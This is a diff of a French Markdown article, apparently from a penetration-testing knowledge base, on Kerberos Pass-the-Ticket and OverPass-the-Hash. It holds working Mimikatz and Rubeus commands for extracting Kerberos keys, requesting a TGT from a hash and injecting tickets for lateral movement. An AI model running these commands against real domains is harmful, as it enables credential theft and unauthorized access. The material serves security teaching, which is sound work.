@@ -3,12 +3,13 @@ public: true # set to true to make the article publishable
 ---
 
 ## Principe
+
 Voler / extraire un ticket kerberos et le réutiliser
+
 - s'il s'agit d'un TGT, on pourra demander de nouveaux TGS
 - s'il s'agit d'un TGS, on pourra l'utiliser pour communiquer avec le service cible.
 
 Pour collecter les tickets Kerberos, on utilisera soit mimikatz, soit rubeus localement.
-
 
 ## Collecter des tickets Kerberos
 
@@ -35,7 +36,9 @@ mimikatz.exe privilege::debug "kerberos::ptt ticket.kirbi"
 ```
 
 ## Créer ses propres tickets
+
 Cette technique s'appelle **OverPass the Hash** ou **Pass The Key**
+
 Prérequis : disposer d'un Hash de mot de passe (RC4_HMAC, AES256_CTS_HMAC_SHA1, etc.)
 
 ### Extraire les clé Kerberos
@@ -48,6 +51,7 @@ mimikatz.exe privilege::debug "sekurlsa::ekeys"
 ### Pass the Key (OverPass the Hash)
 
 Permet de demander un TGT à partir d'un hash
+
 #### Mimikatz
 
 Nécessite d'être administrateur local
@@ -66,12 +70,12 @@ Ne nécessite pas d'être administrateur local :)
 Rubeus.exe  asktgt /domain:domain.local /user:MYUSER /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
 
-
 ## Pass The Ticket
 
 Utiliser les tickets pour réaliser des mouvements latéraux.
 
-### Rubeus 
+### Rubeus
+
 ```
 # Sans ticket préalable : 
 # réalise à la fois le PassTheKey et le Pass The Ticket
@@ -97,5 +101,7 @@ mimikatz.exe privilege::debug "kerberos::ptt ticket.kirbi"
 ```
 
 ## Resources
+
 Présentation parlant de PTT et de Golden Tickets (par Benjamin DELPY)
-https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it
+
+<https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it>
